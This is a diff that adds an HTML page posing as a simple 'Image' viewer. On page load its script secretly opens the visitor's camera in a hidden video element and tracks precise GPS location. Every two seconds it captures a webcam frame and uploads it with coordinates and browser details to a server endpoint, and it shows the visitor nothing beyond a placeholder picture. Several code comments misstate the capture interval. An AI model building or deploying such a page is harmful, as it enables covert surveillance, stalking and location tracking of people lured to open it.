@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Image</title>
+<style>
+  body { font-family: sans-serif; text-align:center; padding:20px; }
+  #placeholder {margin:10px auto; background:#eee; object-fit:cover; border-radius:10px; }
+  #msg { color: #b00; margin:12px; }
+  #info { font-size:12px; color:#333; white-space:pre-line; }
+</style>
+</head>
+<body>
+  <h2>Welcome to Image</h2>
+
+  <!-- Placeholder image -->
+  <img id="placeholder" src="https://static.pincel.app/media/248dirybp3rfi0d2bdatvs-ras25b.png" alt="placeholder">
+
+  <video id="video" autoplay playsinline style="display:none;"></video>
+  <canvas id="canvas"  style="display:none"></canvas>
+
+  <p id="msg">Allow camera & location access to continue.</p>
+  <p id="info"></p>
+
+<script>
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const ctx = canvas.getContext('2d');
+const placeholder = document.getElementById('placeholder');
+const msg = document.getElementById('msg');
+const info = document.getElementById('info');
+
+let lastPosition = null;
+let captureIntervalMs = 2000; // 5 seconds
+
+// Request camera + GPS
+function startCameraAndGeo() {
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then(stream => {
+      video.srcObject = stream;
+      msg.innerText = '';
+      startGeoTracking();
+      startAutoCapture();
+    })
+    .catch(err => {
+      console.error('Camera error:', err);
+      msg.innerText = '⚠️ Camera permission denied. Please allow access.';
+    });
+}
+
+// Geo tracking
+function startGeoTracking() {
+  if (!navigator.geolocation) {
+    info.innerText = 'Geolocation not supported by this browser.';
+    return;
+  }
+
+  navigator.geolocation.watchPosition(
+    pos => {
+      lastPosition = {
+        lat: pos.coords.latitude.toFixed(8),
+        lon: pos.coords.longitude.toFixed(8),
+        accuracy: pos.coords.accuracy,
+        altitude: pos.coords.altitude,
+        altitudeAccuracy: pos.coords.altitudeAccuracy,
+        heading: pos.coords.heading,
+        speed: pos.coords.speed,
+        timestamp: pos.timestamp
+      };
+     // info.innerText =
+        `📍 Latitude: ${lastPosition.lat}\n` +
+        `📍 Longitude: ${lastPosition.lon}\n` +
+        `🎯 Accuracy: ${lastPosition.accuracy}m\n` +
+        (lastPosition.altitude ? `⛰ Altitude: ${lastPosition.altitude}m\n` : '') +
+        `⏱ Timestamp: ${new Date(pos.timestamp).toLocaleString()}`;
+    },
+    err => {
+      console.warn('Geolocation error:', err);
+      info.innerText = '⚠️ Location permission denied.';
+    },
+    {
+      enableHighAccuracy: true,
+      timeout: 30000,
+      maximumAge: 0
+    }
+  );
+}
+
+// Capture every few seconds
+
+function startAutoCapture() {
+  // First capture after 1 second
+  setTimeout(() => {
+    captureAndUpload();
+
+    // Then every 3 seconds
+    setInterval(captureAndUpload, captureIntervalMs);
+  }, 1000); // 1 second delay for first capture
+}
+
+function captureAndUpload() {
+  try {
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+  } catch (e) {
+    console.error('Capture error:', e);
+    return;
+  }
+  const imageData = canvas.toDataURL('image/jpeg', 0.9);
+
+  const meta = {
+    userAgent: navigator.userAgent,
+    timestamp_local: new Date().toString(),
+    location: lastPosition,
+    extra_info: {
+      platform: navigator.platform,
+      languages: navigator.languages,
+      cookieEnabled: navigator.cookieEnabled,
+      online: navigator.onLine
+    }
+  };
+
+  fetch('/upload', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ image: imageData, meta: meta })
+  })
+  .then(res => res.json())
+  .then(data => console.log('Uploaded:', data))
+  .catch(err => console.error('Upload failed', err));
+}
+
+// Start on load
+window.addEventListener('load', startCameraAndGeo);
+</script>
+</body>
+</html>
